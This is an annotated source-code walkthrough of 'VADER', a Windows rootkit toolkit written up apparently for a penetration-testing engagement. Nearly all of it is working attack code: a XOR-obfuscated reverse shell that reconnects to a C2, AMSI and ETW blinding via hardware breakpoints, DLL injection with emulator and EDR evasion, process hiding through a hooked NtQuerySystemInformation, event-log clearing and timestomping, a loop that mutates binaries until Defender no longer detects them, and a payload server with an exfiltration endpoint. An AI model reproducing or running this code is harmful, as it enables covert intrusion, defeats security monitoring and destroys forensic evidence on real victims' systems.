# VADER Rootkit — Annotated Code Walkthrough

Operator-level code tour of every critical VADER component. This covers the *how* — specific techniques, byte patterns, and design decisions at the source level.

---

## 1. Reverse Shell — `shell/vader_shell_live.c`

**Purpose:** XOR-encrypted reverse shell with persistent reconnect. Spawns `cmd.exe` with stdin/stdout/stderr bound to a socket.

**Key technique:** All sensitive strings (C2 IP, command name) are XOR-encoded at compile time and decoded on the stack at runtime. The socket handle is cast directly to `HANDLE` and used as the process's standard I/O, so every byte the remote operator sends goes straight to `cmd.exe`, and every byte `cmd.exe` outputs goes straight back over the wire.

```c
static const unsigned char xCmd[] = {
    0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24  /* "cmd.exe" XOR 0x41 */
};

static void XorDecode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static void SpawnShell(SOCKET sock) {
    STARTUPINFOA si;
    unsigned char cmd[8];
    memcpy(cmd, xCmd, sizeof(xCmd));
    XorDecode(cmd, xCmd_LEN);
    cmd[xCmd_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
}
```

**Why it matters:** The Winsock socket handle *is* a valid kernel handle on Windows — `CreateProcessA` accepts it directly as `hStdInput/Output/Error`. No pipe plumbing, no read/write loops. The shell I/O goes kernel-to-kernel. `CREATE_NO_WINDOW` + `SW_HIDE` means no visible window. `MAX_RETRIES=0` means infinite reconnect — if the C2 drops, the shell reconnects every 5 seconds forever. XOR key `0x41` means no plaintext `cmd.exe` or IP address appears in the binary.

---

## 2. AMSI+ETW Hardware Breakpoint Bypass — `dark_room/dark_room_annotated.c`

**Purpose:** Blind both AMSI (script scanning) and ETW (process telemetry) using hardware breakpoints. Zero bytes modified in memory. Zero `VirtualProtect` calls. Invisible to integrity checks.

**Key technique:** A Vectored Exception Handler (VEH) is registered. Debug registers DR0 and DR1 are pointed at `AmsiScanBuffer` and `EtwEventWrite` respectively. When either function is called, the CPU fires `EXCEPTION_SINGLE_STEP` *before the first instruction executes*. The VEH handler intercepts the exception, sets the return value in RAX, pops the return address from the stack, and resumes — the function never executes a single instruction of its own code.

```c
static LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* AMSI bypass: return E_INVALIDARG */
    if ((void *)pExInfo->ContextRecord->Rip == g_pAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ETW bypass: return STATUS_SUCCESS */
    if ((void *)pExInfo->ContextRecord->Rip == g_pEtwEventWrite) {
        pExInfo->ContextRecord->Rax = 0;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

The DR7 register encoding sets both breakpoints as execution breakpoints, 1-byte length:

```c
ctx.Dr0 = (DWORD64)pAmsi;
ctx.Dr1 = (DWORD64)pEtw;
ctx.Dr7 &= ~(0xFULL << 16);  /* Clear DR0 cond+len */
ctx.Dr7 &= ~(0xFULL << 20);  /* Clear DR1 cond+len */
ctx.Dr7 |= (1 << 0);          /* Enable DR0 locally */
ctx.Dr7 |= (1 << 2);          /* Enable DR1 locally */
```

**Why it matters:** The "return address pop" trick (`RIP = *RSP; RSP += 8`) simulates a `ret` instruction without actually executing one. The function's code is never touched — `amsi.dll` and `ntdll.dll` checksums remain valid. No `VirtualProtect` is called so no `EtwTi` (kernel ETW threat intelligence) event fires. Defender's tamper protection doesn't detect it because there's literally nothing to detect — the bypass lives in CPU debug registers, not in modified memory.

---

## 3. Process Injector — `injection/vader_inject.c`

**Purpose:** Inject the VADER DLL into a target process. Supports two modes: `--spawn` (create a suspended process and inject before it runs) or PID mode (inject into an already-running process).

**Key technique:** All Win32 API function names are XOR-encoded and resolved dynamically via `GetProcAddress` at runtime. This keeps `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` out of the IAT — the v1 build got caught by Defender specifically because those imports were visible in the import table.

```c
static void xd(unsigned char *buf, const unsigned char *enc, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] = enc[i] ^ XK;
    buf[len] = 0;
}

/* Volatile zero — prevents compiler from optimizing out the wipe */
static void sz(void *p, int len) {
    volatile char *v = (volatile char *)p;
    int i;
    for (i = 0; i < len; i++) v[i] = 0;
}

#define R(var, enc, elen) do { \
    xd((unsigned char*)buf, enc, elen); \
    var = (void*)GetProcAddress(hK, buf); \
    sz(buf, sizeof(buf)); \
} while(0)

R(pVAE,  xVirtualAllocEx, xVirtualAllocEx_LEN);
R(pWPM,  xWriteProcessMemory, xWriteProcessMemory_LEN);
R(pCRT,  xCreateRemoteThread, xCreateRemoteThread_LEN);
```

The CREATE_SUSPENDED injection flow:

```c
static BOOL spawn_and_inject(const char *dllPath) {
    /* 1. Spawn target process suspended */
    pCPA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
         CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    /* 2. Inject DLL while target is frozen */
    inject_and_watch(pi.hProcess, pi.dwProcessId, dllPath);

    /* 3. Resume — target runs with DLL already loaded */
    pRT(pi.hThread);
}
```

After injection, the injector calculates the remote addresses of `VdrInit` and `VdrWatch` exports by computing the offset between the local and remote base addresses, then calls them via `CreateRemoteThread`.

**Why it matters:** `CREATE_SUSPENDED` guarantees the DLL is loaded before the target executes a single instruction. AMSI and ETW can be blinded before PowerShell's initialization code even runs. The `sz()` function uses `volatile` to prevent the compiler from optimizing away the zeroing of decoded strings — a common mistake in evasion code.

---

## 4. Injection DLL — `injection/vader_inject_dll_annotated.c`

**Purpose:** DLL payload that arms HWBP on ALL threads in the target process. Unlike `dark_room.exe` which only blinds its own thread, this DLL blinds every thread — including threads that spawn later.

**Key technique:** DllMain is a deliberate no-op. All initialization is deferred to the exported `VdrInit` function, which the injector calls via a separate `CreateRemoteThread`. This defeats Defender's emulator, which enters at `DllMain(DLL_PROCESS_ATTACH)` and follows the code flow — it finds nothing and times out. The real work happens in `VdrInit`, which the emulator never follows.

```c
/* DllMain — NO-OP. Defender's emulator enters here. Finds nothing. */
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hDll);
    return TRUE;
}

/* Real init — called via CreateRemoteThread AFTER DllMain returns */
__declspec(dllexport) DWORD WINAPI VdrInit(LPVOID lpParam) {
    /* SithStalker: resolve indirect syscall SSNs */
    gateCount = gate_init(&g_gate);
    if (gateCount >= 6) g_gateReady = TRUE;

    /* Resolve targets, register VEH, blind all threads */
    g_pAmsiScanBuffer = resolve_function(...);
    g_pEtwEventWrite  = resolve_function(...);
    AddVectoredExceptionHandler(1, InjectHandler);
    set_hwbp_on_thread(GetCurrentThread());
    blind_all_threads(g_dwOwnerPid, myTid);
}
```

The thread enumeration uses Toolhelp32 snapshots and, when SithStalker gates are available, indirect syscalls for `NtOpenThread`, `NtSuspendThread`, `NtSetContextThread`, and `NtResumeThread` — bypassing any EDR user-mode hooks on those functions:

```c
if (g_gateReady) {
    SetSyscall(g_gate.NtOpenThread.ssn, g_gate.NtOpenThread.syscall_addr);
    status = ((NTSTATUS(__stdcall *)(PHANDLE, ACCESS_MASK,
        SS_OBJECT_ATTRIBUTES *, SS_CLIENT_ID *))IndirectSyscall)(
        &hThread, THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        &oa, &cid);
}
```

The `VdrWatch` export is a watchdog that runs every 2 seconds, re-enumerating threads and setting HWBP on any new ones. PowerShell spawns threads for tab completion, background jobs, and runspace pools — without the watchdog, those threads would bypass AMSI.

**Why it matters:** The emulator evasion is elegant — there's nothing to detect at scan time. `DllMain` does nothing suspicious, and the emulator has no way to know that `VdrInit` will be called later by a remote thread. The indirect syscall path (SithStalker) means that even if an EDR hooks `NtSetContextThread` in user mode, the HWBP setting bypasses it entirely by going straight to the kernel.

---

## 5. Inline Hook Engine — `cloak/hook_engine.c`

**Purpose:** x64 inline hooking engine. Overwrites the first N bytes of a target function with an absolute JMP to the hook, and creates a trampoline that preserves the original bytes so the hook can call the real function.

**Key technique:** 12-byte absolute JMP using `mov rax, imm64; jmp rax`. This is the only x64 JMP that can reach any address in the 64-bit address space without a register reservation or relative offset calculation.

```c
void hook_write_jmp(BYTE *dst, void *target) {
    dst[0] = 0x48;                          /* REX.W prefix */
    dst[1] = 0xB8;                          /* mov rax, imm64 */
    *(UINT64 *)(dst + 2) = (UINT64)target;  /* 8-byte absolute address */
    dst[10] = 0xFF;                         /* jmp rax */
    dst[11] = 0xE0;
}
```

Two trampoline modes handle different function types:

```c
if (h->self_contained)
    tramp_size = h->save_size;   /* Full NT stub copy — no JMP back */
else
    tramp_size = h->save_size + HOOK_PATCH_SIZE;  /* Saved bytes + JMP back */

BYTE *tramp = (BYTE *)VirtualAlloc(
    NULL, tramp_size, MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
memcpy(tramp, h->saved_bytes, h->save_size);

if (!h->self_contained)
    hook_write_jmp(tramp + h->save_size, (BYTE *)h->target + h->save_size);
```

**Why it matters:** The `self_contained` flag exists because of Windows 11 Build 26200+, which rejects mid-function entry into ntdll syscall stubs. For NT functions (like `NtQuerySystemInformation`), the entire 24-byte stub — including the `syscall` instruction and `ret` — is copied into the trampoline. The trampoline IS the complete syscall stub and doesn't need to JMP back into ntdll. For non-NT functions (iphlpapi etc), the trampoline saves the overwritten bytes and JMPs back to `target+N` to continue execution. Any bytes between the 12-byte patch and the `save_size` boundary are NOP-filled (`0x90`).

---

## 6. Process Hiding — `cloak/hide_process.c`

**Purpose:** Hook `NtQuerySystemInformation` to unlink VADER processes from the process list. Task Manager, `tasklist.exe`, and any tool using this API won't see them.

**Key technique:** When `SystemProcessInformation` (class 5) is queried, the hook calls the original function via the trampoline, then walks the returned `SYSTEM_PROCESS_INFORMATION` linked list. The list is a chain of variable-size entries connected by `NextEntryOffset`. Hiding a process means either adjusting `prev->NextEntryOffset` to skip over the hidden entry, or (for the first entry) `memmove`-ing the remainder of the buffer forward.

```c
static NTSTATUS NTAPI hook_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength
) {
    /* Call the real function via trampoline */
    pfnNtQuerySystemInformation orig =
        (pfnNtQuerySystemInformation)g_hook_nqsi.trampoline;
    NTSTATUS status = orig(SystemInformationClass, SystemInformation,
                           SystemInformationLength, ReturnLength);

    if (status != 0 || SystemInformationClass != SystemProcessInformation)
        return status;

    SYSTEM_PROCESS_INFO *prev = NULL;
    SYSTEM_PROCESS_INFO *curr = (SYSTEM_PROCESS_INFO *)SystemInformation;

    for (;;) {
        if (should_hide_process(&curr->ImageName)) {
            if (prev)
                prev->NextEntryOffset += curr->NextEntryOffset;
            else {
                /* First entry — shift buffer forward */
                ULONG shift = curr->NextEntryOffset;
                ULONG remaining = dataSize - offset - shift;
                memmove(curr, (BYTE *)curr + shift, remaining);
                if (ReturnLength) *ReturnLength -= shift;
                continue;  /* Re-check same position */
            }
        } else {
            prev = curr;
        }
        if (curr->NextEntryOffset == 0) break;
        curr = (SYSTEM_PROCESS_INFO *)((BYTE *)curr + curr->NextEntryOffset);
    }
    return status;
}
```

The hook is installed with `self_contained=TRUE` and `save_size=24` — the full NT stub is copied into the trampoline:

```c
g_hook_nqsi.target         = GetProcAddress(ntdll, "NtQuerySystemInformation");
g_hook_nqsi.hook           = hook_NtQuerySystemInformation;
g_hook_nqsi.save_size      = 24;   /* full NT stub incl. syscall+ret */
g_hook_nqsi.self_contained = TRUE;
```

**Why it matters:** The hidden process list is defined in `cloak.h` — a NULL-terminated array of wide strings matched case-insensitively. The `continue` after `memmove` is critical: when the first entry is hidden, the buffer shifts forward and the new first entry needs to be checked at the same pointer position. The `ReturnLength` adjustment prevents callers from reading past the shortened buffer.

---

## 7. Anti-Forensics Cleanup — `forensics/vader_clean_annotated.c`

**Purpose:** Post-operation evidence destruction. Five phases: canary file deletion, event log clearing, prefetch cleanup, timestomping, and self-deletion.

**Key technique:** All file paths, event log channel names, and API names are XOR-encoded (key `0x93`, callsign JULIET). The tool checks privilege level at startup — SYSTEM and admin get full cleanup; standard users get canary deletion only (canaries are in `C:\Windows\Temp`, which is world-writable).

Phase 1 — Canary deletion iterates a table of XOR-encoded paths:

```c
CanaryEntry canaries[] = {
    { xCanarySvc,     sizeof(xCanarySvc),     "V4 DELTA svc_health.log" },
    { xCanaryVer,     sizeof(xCanaryVer),     "V5 ECHO ver_cache.log" },
    { xCanaryHwmon,   sizeof(xCanaryHwmon),   "V6 FOXTROT hwmon_diag.log" },
    { xCanaryOsp,     sizeof(xCanaryOsp),     "V7 GOLF osp_telemetry.log" },
    { xCanaryInject,  sizeof(xCanaryInject),  "Phase4 HOTEL inject_status" },
    { xCanaryStager,  sizeof(xCanaryStager),  "Stager INDIA stager_canary" },
};
```

Phase 2 — Event log clearing dynamically resolves `wevtapi.dll!EvtClearLog` to avoid static import signatures, then clears PowerShell/Operational, Sysmon/Operational, Security, and Application logs.

Phase 4 — Timestomping reads creation/access/write times from `kernel32.dll` (a file that's existed since Windows NT) and applies them to the target file:

```c
HANDLE hRef = CreateFileA(kernel32_path, GENERIC_READ, ...);
GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);

HANDLE hTarget = CreateFileA(targetPath, FILE_WRITE_ATTRIBUTES, ...);
SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
```

Phase 5 — Self-deletion uses `MoveFileExA` with `MOVEFILE_DELAY_UNTIL_REBOOT` to schedule the binary for deletion on next reboot (can't delete a running executable).

**Why it matters:** The cleanup tool writes its own evidence log to `C:\Windows\Temp\vader_clean_log.txt` (tagged `[J]` for JULIET) so the operator can verify what was cleaned. Each VADER component uses a different XOR key and NATO callsign — DELTA, ECHO, FOXTROT, GOLF, HOTEL, INDIA, JULIET — so a compromise of one key doesn't decrypt strings from other components.

---

## 8. XOR Mutation Pipeline — `mutate.py`

**Purpose:** Rotate XOR keys across all VADER components. For each component: generate a new random key, re-encode every XOR array in the source, recompile, and scan against Defender. If detected, rotate again (up to 10 attempts). Backs up source before mutation and restores on failure.

**Key technique:** The pipeline parses C source files with regex to find `#define XOR_KEY`, all `static const unsigned char` arrays, and inline `buf[i] ^= 0xNN` patterns. It decodes each array with the old key, re-encodes with the new key, and rewrites the source file.

```python
def re_encode_array(raw_bytes, old_key, new_key):
    plaintext = [(b ^ old_key) & 0xFF for b in raw_bytes]
    return [(b ^ new_key) & 0xFF for b in plaintext]

def gen_new_key(current_key):
    while True:
        k = secrets.randbelow(0x7F) + 0x80  # Range 0x80-0xFF
        if k != current_key:
            return k
```

The rotation loop — mutate, compile, scan, retry if detected:

```python
for attempt in range(1, MAX_ATTEMPTS + 1):
    old_key, new_key = mutate_source(comp["source"], comp["key_define"])
    if not compile_component(comp):
        # Restore backup and bail
        with open(comp["source"], "w") as f: f.write(backup)
        return False

    scan_result = scan_binary(binary_path)
    if scan_result == "CLEAN":
        return True
    elif scan_result == "DETECTED":
        continue  # Try another key
```

Each component has its own config entry defining source path, output directory, compile flags, key define name, and decode function pattern:

```python
COMPONENTS = {
    "dark_room": {
        "source": "dark_room/dark_room_annotated.c",
        "key_define": "XOR_KEY",
        "decode_fn_pattern": "xor_decode",
        "compile_flags": "/Fe:dark_room.exe /O1 /GS-",
        ...
    },
    # ... 7 more components
}
```

**Why it matters:** New keys are generated in the range `0x80-0xFF` — high-byte range avoids producing NULL bytes in encoded arrays (which would break string handling). The `secrets` module provides cryptographically secure randomness. The scan uses `MpCmdRun.exe -Scan -ScanType 3 -DisableRemediation` to test against Defender without quarantining the binary. The backup-and-restore pattern means a failed mutation never leaves the source in a broken state.

---

## 9. HTTP Payload Server — `stagers/vader_serve.py`

**Purpose:** Minimal HTTP server that maps clean URL paths to VADER payloads on disk. The stager binary downloads from these endpoints.

**Key technique:** URL-to-file mapping with streaming delivery. No directory listing, no path traversal — only whitelisted endpoints return data.

```python
PAYLOAD_MAP = {
    "/dark_room":   "dark_room/dark_room.exe",
    "/inject_dll":  "injection/vader_inject.dll",
    "/inject_exe":  "injection/vader_inject.exe",
    "/shell":       "shell/vader_shell.exe",
    "/persist":     "vectors/v7_phantom_dll/osppc.dll",
}

def do_GET(self):
    path = self.path.split("?")[0]
    if path not in PAYLOAD_MAP:
        self.send_response(404)
        return
    file_path = os.path.join(ROOT_DIR, PAYLOAD_MAP[path])
    # Stream in 8KB chunks
    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk: break
            self.wfile.write(chunk)
```

Also supports `POST /recon` for implant data exfiltration — incoming data is written to timestamped files in `recon/implant_uploads/`. HEAD requests let the stager probe payload availability before downloading.

**Why it matters:** The 8KB chunked streaming means large payloads don't get loaded into memory all at once. The `Content-Disposition` header makes the download look like a legitimate file download to network monitors. Endpoints are generic enough (`/dark_room`, `/shell`) that they don't immediately flag as malicious in HTTP logs — compared to something like `/vader_rootkit_payload.exe`.

---

## 10. Deployment Orchestrator — `deploy.py`

**Purpose:** Master automation script. Chains: recon, compile, scan, dark room activation, vector selection, deployment, canary monitoring, C2 listener launch, and evidence collection.

**Key technique:** Target profiles define per-target constraints (admin locked, Defender on, excluded vectors). Auto-selection scores vectors based on recon findings and profile preferences, then picks the highest-scoring viable option.

```python
PROFILES = {
    "radon": {
        "name": "RADON LAPTOP",
        "admin_locked": True,
        "defender_on": True,
        "standard_user": True,
        "office_installed": True,
        "preferred_vectors": ["V7", "V6"],
        "excluded_vectors": ["V4"],
    },
}

def auto_select_vector(findings, profile=None):
    candidates = []
    if findings.get("office_installed") and "V7" not in excluded:
        candidates.append(("V7", 90, "Office + writable PATH"))
    if findings.get("writable_svcs") and "V4" not in excluded:
        candidates.append(("V4", 80, "Writable SYSTEM svc"))
    # Preferred vectors get +20 bonus
    for vid in preferred:
        for i, (cv, score, reason) in enumerate(candidates):
            if cv == vid:
                candidates[i] = (cv, score + 20, reason + " [PREFERRED]")
    candidates.sort(key=lambda x: x[1], reverse=True)
    return candidates[0][0] if candidates else None
```

The full `--pentest` automation chain runs 10 phases sequentially:

1. Load target profile
2. Compile all components (via `vcvars64.bat`)
3. Scan all binaries against Defender
4. Run PowerShell recon script
5. Auto-select vector from recon findings
6. Run dark room (AMSI+ETW blind)
7. Deploy vector (copy payload, trigger execution)
8. Monitor canary file (poll every 5s, timeout 300s)
9. Collect evidence (JSON report + canary copy + deploy log)
10. Start C2 listener if SYSTEM achieved

Canary monitoring polls the vector's canary file until content appears or timeout:

```python
def monitor_canary(vector_id, timeout=300, interval=5):
    while (time.time() - start) < timeout:
        content = check_canary(canary)
        if content:
            if "SYSTEM" in content:
                log_ok("SYSTEM EXECUTION CONFIRMED")
            return content
        time.sleep(interval)
```

**Why it matters:** The pre-deploy scan prevents deploying a binary that Defender will immediately quarantine. If a binary comes back `DETECTED`, the operator is told to run `mutate.py` first. The profile system means the same deploy script works across different targets without modification — constraints like "admin is PIN-locked, no UAC bypass possible" are baked into the profile rather than discovered mid-operation. Evidence collection produces a JSON report with timestamps, scan results, and canary content — structured data for the CSEC engagement write-up.
